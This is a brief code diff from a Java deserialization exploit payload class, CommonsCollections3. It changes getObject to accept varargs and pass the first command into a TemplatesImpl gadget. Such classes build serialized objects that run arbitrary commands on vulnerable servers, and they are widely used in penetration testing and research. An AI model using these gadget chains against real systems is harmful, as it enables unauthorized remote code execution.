@@ -32,8 +32,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		Object templatesImpl = Gadgets.createTemplatesImpl(command);
+	public Object getObject(final String ... command) throws Exception {
+		Object templatesImpl = Gadgets.createTemplatesImpl(command[0]);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
